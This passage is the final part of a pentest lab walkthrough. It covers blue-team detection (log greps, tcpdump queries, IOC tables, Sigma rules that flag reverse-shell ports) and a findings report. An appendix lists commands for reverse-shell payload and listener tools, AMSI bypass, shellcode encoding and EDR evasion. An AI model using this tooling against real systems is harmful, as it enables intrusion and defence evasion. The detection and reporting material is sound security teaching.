```

---

## Phase 6: Detection (Blue Team)

### Objective

Demonstrate how defenders can detect the attack techniques used in this assessment.

### Step 6.1: Log Analysis

Identify attack indicators in system and application logs.

```bash
# SSH authentication logs (on target server)
root@cptc11-server-1:~# grep -i "accepted\|failed" /var/log/auth.log

# Expected indicators:
# Jan 10 10:15:23 cptc11-server-1 sshd[1234]: Failed password for admin from 10.10.10.100 port 54321 ssh2
# Jan 10 10:15:24 cptc11-server-1 sshd[1234]: Failed password for admin from 10.10.10.100 port 54321 ssh2
# Jan 10 10:15:25 cptc11-server-1 sshd[1234]: Accepted password for admin from 10.10.10.100 port 54321 ssh2
#
# INDICATOR: Multiple failed attempts followed by success = credential brute force

# Check for privilege escalation
root@cptc11-server-1:~# grep -i "sudo\|su" /var/log/auth.log

# Expected indicators:
# Jan 10 10:20:00 cptc11-server-1 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/su -
#
# INDICATOR: Privilege escalation via sudo

# Apache access logs for web enumeration
cat /var/log/apache2/access.log | grep "404\|403" | head -20

# Expected indicators:
# 10.10.10.100 - - [10/Jan/2026:10:00:01] "GET /admin/ HTTP/1.1" 301 -
# 10.10.10.100 - - [10/Jan/2026:10:00:01] "GET /backup/ HTTP/1.1" 404 -
# 10.10.10.100 - - [10/Jan/2026:10:00:02] "GET /config/ HTTP/1.1" 404 -
# 10.10.10.100 - - [10/Jan/2026:10:00:02] "GET /.git/ HTTP/1.1" 404 -
# ... (many 404 responses in rapid succession)
#
# INDICATOR: Directory enumeration detected (rapid 404 responses from single IP)
```

### Step 6.2: Network Traffic Analysis

Identify suspicious network patterns.

```bash
# Capture and analyze network traffic
tcpdump -i eth0 -w /tmp/capture.pcap

# Analysis indicators:
# 1. Port scanning detection:
#    - Multiple SYN packets to sequential ports
#    - No corresponding SYN-ACK or data exchange
#    - Pattern: Single source, many destination ports

# 2. SMB enumeration detection:
#    - Null session attempts (empty username)
#    - RID cycling queries (SAMR protocol)
#    - Multiple share enumeration requests

# 3. Credential brute force detection:
#    - Multiple authentication failures
#    - Same source, single destination
#    - Rapid connection attempts

# 4. Reverse shell detection:
#    - Outbound connection to unusual port
#    - Long-duration TCP session
#    - Interactive shell traffic patterns (small packets, bidirectional)

# Example detection query with tcpdump:
tcpdump -r /tmp/capture.pcap 'tcp[tcpflags] & (tcp-syn) != 0 and tcp[tcpflags] & (tcp-ack) == 0' | \
    awk '{print $3}' | cut -d. -f1-4 | sort | uniq -c | sort -rn | head

# High SYN count from single IP = port scanning
```

### Step 6.3: IOC Identification

Document Indicators of Compromise for threat hunting.

```
+------------------------------------------------------------------+
|              INDICATORS OF COMPROMISE (IOCs)                      |
+------------------------------------------------------------------+
| NETWORK INDICATORS:                                               |
| - Source IP: 10.10.10.100 (attack platform)                      |
| - Destination ports: 21, 22, 25, 53, 80, 443, 445, 3306          |
| - Reverse shell: Outbound TCP to port 4444                       |
| - SMB null session attempts                                       |
+------------------------------------------------------------------+
| HOST INDICATORS:                                                  |
| - Failed SSH logins followed by success                          |
| - Sudo privilege escalation from admin user                      |
| - Python process spawning shell                                   |
| - SSH key access to internal hosts                               |
+------------------------------------------------------------------+
| FILE INDICATORS:                                                  |
| - Access to /backup.bak and /config.php.bak                      |
| - Creation of files in /tmp                                       |
| - Modification of .bash_history                                   |
+------------------------------------------------------------------+
| BEHAVIORAL INDICATORS:                                            |
| - Directory enumeration (rapid 404 responses)                    |
| - Credential stuffing (multiple auth failures)                   |
| - Lateral movement (SSH from server to workstations)             |
| - Data exfiltration via SMB                                       |
+------------------------------------------------------------------+
```

### Step 6.4: Detection Rules

Example detection signatures for the observed attack patterns.

```yaml
# Sigma rule for SSH brute force detection
title: SSH Brute Force Attempt
status: stable
logsource:
    product: linux
    service: sshd
detection:
    selection:
        eventtype: 'authentication_failure'
    timeframe: 5m
    condition: selection | count() by src_ip > 5
level: medium

---
# Sigma rule for directory enumeration
title: Web Directory Enumeration
status: stable
logsource:
    category: webserver
detection:
    selection:
        status: 404
    timeframe: 1m
    condition: selection | count() by src_ip > 50
level: medium

---
# Sigma rule for reverse shell detection
title: Potential Reverse Shell
status: stable
logsource:
    category: network_connection
detection:
    selection:
        direction: outbound
        dst_port:
            - 4444
            - 4445
            - 5555
            - 8888
    filter:
        process_name:
            - 'chrome'
            - 'firefox'
    condition: selection and not filter
level: high
```

### Detection Summary

```
DETECTION COVERAGE MATRIX
=========================

| Attack Phase      | Detection Method       | Confidence |
|-------------------|------------------------|------------|
| Network Scan      | IDS/Firewall Logs     | HIGH       |
| Port Scan         | Network Flow Analysis | HIGH       |
| Service Fingerprint| Deep Packet Inspection| MEDIUM     |
| DNS Enumeration   | DNS Query Logs        | HIGH       |
| Web Enumeration   | Web Server Logs       | HIGH       |
| SMB Enumeration   | SMB Audit Logs        | MEDIUM     |
| Credential Spray  | Auth Failure Logs     | HIGH       |
| Initial Access    | Auth Success After Fail| HIGH      |
| Priv Escalation   | Sudo/Su Audit Logs    | HIGH       |
| Lateral Movement  | Network Connections   | MEDIUM     |
| Data Exfiltration | DLP/Network Egress    | MEDIUM     |
```

---

## Reporting Notes

### Evidence Collection Checklist

- [ ] Screenshots of all successful exploits
- [ ] Command output logs from reconnaissance phase
- [ ] Captured credentials and their sources
- [ ] Network traffic captures (.pcap files)
- [ ] Extracted files (configs, backups, credentials)
- [ ] Timeline of all actions taken
- [ ] Hash values of compromised systems

### Findings Documentation Template

```
FINDING #1: Anonymous FTP Access with Sensitive Data
====================================================
Severity: HIGH
CVSS: 7.5 (High)

Description:
The FTP server at 10.10.10.20 allows anonymous access and contains
sensitive backup files including database dumps and configuration files.

Evidence:
- Successful anonymous login to FTP
- Retrieved files: database_backup.sql, config.tar.gz
- Credentials extracted from configuration files

Impact:
- Unauthorized access to sensitive data
- Credential exposure enabling further attacks
- Potential compliance violations (data exposure)

Recommendation:
1. Disable anonymous FTP access
2. Implement strong authentication
3. Encrypt sensitive files at rest
4. Review and rotate exposed credentials
5. Implement network segmentation

References:
- CWE-284: Improper Access Control
- NIST SP 800-53: AC-3 Access Enforcement
```

### Risk Summary Table

| Finding | Severity | CVSS | Exploited | Remediation Priority |
|---------|----------|------|-----------|----------------------|
| Anonymous FTP | HIGH | 7.5 | Yes | Immediate |
| Weak SSH Passwords | HIGH | 8.1 | Yes | Immediate |
| Zone Transfer | MEDIUM | 5.3 | Yes | High |
| Directory Listing | MEDIUM | 5.0 | Yes | High |
| Exposed Backup Files | HIGH | 7.5 | Yes | Immediate |
| SMB Null Sessions | MEDIUM | 5.3 | Yes | High |
| Password Reuse | HIGH | 8.0 | Yes | Immediate |

### Remediation Priorities

1. **Immediate (24-48 hours)**
   - Disable anonymous FTP access
   - Change all compromised passwords
   - Remove exposed backup files from web server
   - Implement account lockout policies

2. **High (1-2 weeks)**
   - Disable DNS zone transfers
   - Configure proper SMB security
   - Implement network segmentation
   - Deploy multi-factor authentication

3. **Medium (1 month)**
   - Implement intrusion detection systems
   - Configure centralized logging
   - Conduct security awareness training
   - Establish vulnerability management program

---

## Appendix A: Tool Command Reference

### Reconnaissance Tools

| Tool | Purpose | Basic Command |
|------|---------|---------------|
| network-scanner | Host discovery | `python tool.py 10.10.10.0/24 -v` |
| port-scanner | Port enumeration | `python tool.py TARGET -p 1-1000` |
| service-fingerprinter | Version detection | `python tool.py TARGET -p PORT` |
| dns-enumerator | DNS reconnaissance | `python tool.py DOMAIN -n NS -z` |

### Enumeration Tools

| Tool | Purpose | Basic Command |
|------|---------|---------------|
| web-directory-enumerator | Web path discovery | `python tool.py URL -e php,txt` |
| smb-enumerator | Share enumeration | `python tool.py TARGET --port 445` |
| credential-validator | Credential testing | `python tool.py TARGET --protocol ssh` |

### Exploitation Tools

| Tool | Purpose | Basic Command |
|------|---------|---------------|
| hash-cracker | Password cracking | `python tool.py HASH -w wordlist.txt` |
| payload-generator | Payload creation | `python tool.py --type reverse_shell` |
| reverse-shell-handler | Shell handling | `python tool.py --listen --port 4444` |

### Evasion Tools

| Tool | Purpose | Basic Command |
|------|---------|---------------|
| amsi-bypass | AMSI evasion | `python amsi_bypass.py --technique X` |
| shellcode-encoder | Shellcode encoding | `python shellcode_encoder.py --encoding xor` |
| edr-evasion-toolkit | EDR bypass | `python edr_evasion.py --technique direct_syscalls` |

---

## Appendix B: Environment Reset

```bash
# Complete environment teardown
cd /Users/ic/cptc11/docker
docker-compose down -v

# Remove all related images (optional)
docker rmi $(docker images -q cptc11-*)

# Rebuild fresh environment
docker-compose build --no-cache
docker-compose up -d

# Verify clean state
docker-compose ps
```

---

**Document End**

*This walkthrough is intended for authorized security testing and educational purposes only. All techniques should only be applied to systems you have explicit permission to test.*
